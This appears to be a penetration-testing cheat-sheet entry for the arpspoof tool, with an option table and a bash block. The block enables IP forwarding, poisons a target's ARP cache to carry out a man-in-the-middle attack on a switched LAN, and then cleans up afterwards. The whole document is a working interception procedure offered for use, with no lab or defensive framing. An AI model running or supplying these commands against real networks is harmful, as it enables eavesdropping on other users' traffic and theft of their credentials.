This is an extremely effective way of sniffing traffic on a switch.

| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `‐i interface`     | Specify the interface to use.                                                                                                                                                                                                                                                                                                                                                                                    |
| `‐t target`        | Specify a particular host to ARP poison (if not specified, all hosts on the LAN).<br>Repeat to specify multiple hosts. r Poison both hosts (host and target) to capture traffic in both directions. (only valid in conjuntion with -t)                                                                                                                                                                           |
| `host`               | Specify the host you wish to intercept packets for (usually the local gateway).                                                                                                                                                                                                                                                                                                                                  |
| `‐c own/host/both` | Specify which hardware address t use when restoring the arp configuration; while cleaning up, packets can be send with the own address as well as with the address of the host. Sending packets with a fake hw address can disrupt connectivity with certain switch/ap/bridge configurations, however it works more reliably than using the own address, which is the default way arpspoof cleans up afterwards. |

# MitM
```bash
# Turn on the packet forwarding in Linux
# By enabling the packet forwarding, you disguise your local machine to act as the network router.
$ sysctl -w net.ipv4.ip_forward=1
$ echo '1' > /proc/sys/net/ipv4/ip_forward # enable packet forwarding, IP forwarding

$ arpspoof [-i <Network_Interface_Name>] [-t <target_IP>] [-r <impersonated_IP>] # ARP spoofing / MitM attack (remeber to turn on IP forwarding)

# Stopping the attack
# kill arpspoof proceses and
# Turn off the packet forwarding in Linux
$ sysctl -w net.ipv4.ip_forward=0
$ echo '0' > /proc/sys/net/ipv4/ip_forward # disable packet forwarding, IP forwarding
